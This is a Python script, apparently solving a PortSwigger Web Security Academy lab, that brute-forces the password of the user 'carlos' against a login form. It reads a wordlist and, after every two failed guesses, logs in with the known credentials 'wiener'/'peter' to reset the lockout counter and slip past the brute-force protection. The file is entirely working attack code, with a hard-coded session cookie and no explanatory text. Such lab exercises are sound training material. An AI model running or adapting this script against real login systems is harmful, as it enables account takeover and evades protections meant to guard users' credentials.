import requests

burp0_url = "https://0aec007d03dc1378806bc12e00800089.web-security-academy.net:443/login"
burp0_cookies = {"session": "sHBvboqkXbEIXSLL8ROGGlNa3gfeSgzA"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://0aec007d03dc1378806bc12e00800089.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aec007d03dc1378806bc12e00800089.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=0, i"}
burp0_data = {"username": "username", "password": "password"}

CORRECT_USERNAME = "wiener"
CORRECT_PASSWORD = "peter"

USERNAME = "carlos"

def reset_guess_limit():
    global CORRECT_PASSWORD, CORRECT_USERNAME
    
    # Make a successful login request
    data = burp0_data.copy()
    data["username"] = CORRECT_USERNAME
    data["password"] = CORRECT_PASSWORD
    
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data, allow_redirects=False)

    assert r.status_code == 302

def is_valid_password(password: str):
    global USERNAME
    
    data = burp0_data.copy()
    data["username"] = USERNAME
    data["password"] = password

    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data, allow_redirects=False)
    return r.status_code == 302

with open('portswigger-wordlists/passwords', 'r') as file:
    guess_tries = 0
    reset_guess_limit()
    for line in file:
        line = line.strip()
        
        if guess_tries >= 2:
            print("Resetting")
            guess_tries = 0
            reset_guess_limit()

        print("Trying: " + line)
        if is_valid_password(line):
            print(f"[!] Found password: {line}")
            exit(0)
        guess_tries += 1